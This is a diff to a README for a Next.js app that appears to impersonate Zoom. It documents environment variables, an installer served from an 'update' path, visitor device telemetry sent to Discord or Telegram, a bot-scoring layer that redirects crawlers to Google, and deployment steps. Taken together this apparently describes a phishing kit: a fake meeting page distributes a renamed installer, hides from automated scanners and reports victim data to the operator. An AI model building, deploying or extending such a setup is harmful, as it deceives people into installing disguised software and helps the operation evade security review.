@@ -24,10 +24,70 @@ This project uses [`next/font`](https://nextjs.org/docs/app/building-your-applic
 
 Create a `.env.local` file in the project root with the following values:
 
-- `DISCORD_WEBHOOK_URL`: Incoming webhook URL that receives telemetry and device info events.
-- `NEXT_PUBLIC_ZOOM_WIN_URL` (optional): Override URL for the Windows installer. If omitted, the app serves `public/assets/setup/update/em_8ybPmrAI_installer_Win7-Win11_x86_x64.msi`.
+### Required Environment Variables
+
+- `NEXT_PUBLIC_ZOOM_WIN_URL` (optional): Override URL for the Windows installer. If omitted, the app serves `public/assets/setup/update/zoominstaller.msi`.
 - `NEXT_PUBLIC_ZOOM_MAC_URL`: URL for the macOS installer (`ZoomInstaller.pkg`).
 - `NEXT_PUBLIC_MEETING_LINK`: Fallback meeting URL for Join Meeting actions.
+- `NEXT_PUBLIC_SENTINEL_PROJECT_KEY`: Your Sentinel anti-bot protection project key (required for bot detection).
+
+### Optional Environment Variables
+
+- `DISCORD_WEBHOOK_URL`: Incoming webhook URL that receives telemetry, device info, and bot detection alerts.
+- `TELEGRAM_BOT_TOKEN`: Telegram bot token for notifications.
+- `TELEGRAM_CHAT_ID`: Telegram chat ID for notifications.
+
+See `example.env` for a template with all available environment variables.
+
+## Sentinel Anti-Bot Protection
+
+This application integrates [Sentinel](https://sentinel-anitbot-production.up.railway.app) for bot detection and protection.
+
+### Getting Your Sentinel Project Key
+
+1. Register your project with Sentinel:
+
+```bash
+curl -X POST https://sentinel-anitbot-production.up.railway.app/api/projects/register \
+  -H "Content-Type: application/json" \
+  -d '{"name": "Zoom-Next"}'
+```
+
+2. Save the returned `projectKey` (format: `pk_xxx...`)
+
+3. Add it to your `.env.local` file:
+
+```
+NEXT_PUBLIC_SENTINEL_PROJECT_KEY=pk_your_key_here
+```
+
+### How Sentinel Works
+
+- Analyzes browser signals (webdriver, plugins, screen resolution, etc.)
+- Assigns a bot score from 0-100
+- Actions:
+  - **0-39**: Allow (human)
+  - **40-69**: Challenge (suspicious)
+  - **70-100**: Block (bot) - redirects to Google
+- Sends alerts to Discord/Telegram when bots are detected
+
+## Deployment
+
+### Deploy to Coolify
+
+This project includes `nixpacks.toml` for automatic Coolify deployment:
+
+1. Push your code to a Git repository
+2. In Coolify dashboard, create a new application
+3. Connect to your repository
+4. Set environment variables in Coolify
+5. Coolify will automatically detect `nixpacks.toml` and deploy
+6. Enable auto-deploy to trigger builds on git push
+
+### Deploy to Railway/Vercel
+
+The project also works with Railway and Vercel. Set the same environment variables in your platform's dashboard.
+
 
 ## Learn More
 
